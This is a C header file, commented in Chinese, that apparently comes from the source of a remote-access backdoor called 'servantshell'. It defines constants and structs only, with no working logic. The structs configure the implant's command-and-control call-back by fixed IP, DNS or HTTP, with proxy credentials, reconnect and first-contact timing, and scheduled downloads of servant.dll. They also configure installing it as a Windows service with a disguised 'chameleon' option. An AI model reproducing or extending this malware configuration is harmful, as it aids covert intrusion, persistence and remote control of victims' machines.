#pragma once

#define CONNECT_FLAG 0xFFFA0FFF
#define CONNECT_CONFIG_FACTOR1 1
#define CONNECT_CONFIG_FACTOR2 3

#define SERVICE_FLAG 0xFFFA1FFF
//上线方式
enum
{
	//固定IP上线
	CONNECT_IP = 0x00,
	//域名解析上线
	CONNECT_DNS,
	//HTTP解析IP上线
	CONNECT_HTTP
};

//代理方式
enum
{
	//sock5代理
	PROXY_SOCK5 = 0x00,
	//HTTP代理
	PROXY_HTTP,
	//ISA代理
	PROXY_ISA
};

#define SERVANTSHELL_REALNAME_LENGTH 17

#pragma pack(1)
typedef struct  _CONNECT_INFO
{
	//结构体标记
	int nFlag;
	//上线方式
	int nConnectType;
	//上线地址
	char szAddr[64]; 
	//代理方式
	int nPort;
	int nProxyType;
	//代理地址
	char szProxyAddr[64];
	//代理用户名
	char szProxyUsername[32];
	//代理密码
	char szProxyPassword[32];
	//代理端口
	int nProxyPort;
	//和服务器断开后,尝试连接的时间间隔
	int	nTryConnectIntervalM;
	//默认的连接方式
	int nDefaultCommType;	//0-detect 1-http 2-dns
	//启动后第一次连接服务端的时间
	int nFirstConnectHour;
	int nFirstConnectMinute;
	//首次尝试下载servant.dll的偏移时间(s)
	UINT nFirstDownSvtOffsetS;
	//每次尝试下载servant.dll的间隔时间(s)
	UINT nDownSvtIntervalS;
	//servantshell部署后的真实名称
	char szGroups[255];
	char szServantshellRealname[SERVANTSHELL_REALNAME_LENGTH];
}CONNECT_INFO,*PCONFIG_INFO;

typedef struct _SERVICE_INFO
{
	//结构体标记
	int nFlag;
	//服务名
	char szServiceName[128];
	//显示名称
	char szDisplayName[128];
	//服务描述
	char szServiceDecript[128];
	//安装路径
	TCHAR szInstalPath[256];
	//是否采用混淆安装
	BOOL bUseChameleon;
}SERVICE_INFO,*PSERVICE_INFO;